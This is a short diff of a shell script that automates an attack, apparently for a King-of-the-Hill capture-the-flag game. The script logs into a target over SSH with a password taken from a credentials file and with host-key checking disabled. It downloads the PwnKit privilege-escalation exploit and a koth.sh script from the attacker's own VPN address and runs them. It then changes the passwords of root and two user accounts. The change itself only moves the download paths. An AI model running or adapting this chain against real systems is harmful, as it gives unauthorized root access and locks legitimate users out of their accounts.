@@ -42,8 +42,8 @@ ssh_pass=$(cat creds.txt | grep 'fortuna:' | cut -d ':' -f 2)
 vpn=$(ip a show dev tun0 | awk '/inet / {print $2}' | cut -d'/' -f1)
 
 sshpass -p "$ssh_pass" ssh -o StrictHostKeyChecking=no fortuna@"$IP" << EOF
-    cd /tmp && wget http://$vpn/PwnKit && chmod +x PwnKit && ./PwnKit
-    cd /boot && wget http://$vpn/koth.sh && chmod +x koth.sh && ./koth.sh "$vpn" "$username"
+    cd /tmp && wget http://$vpn/bin/PwnKit && chmod +x PwnKit && ./PwnKit
+    cd /boot && wget http://$vpn/Scripts/koth.sh && chmod +x koth.sh && ./koth.sh "$vpn" "$username"
     echo "root:$new_password" | chpasswd
     echo "fortuna:$new_password" | chpasswd
     echo "hermes:$new_password" | chpasswd
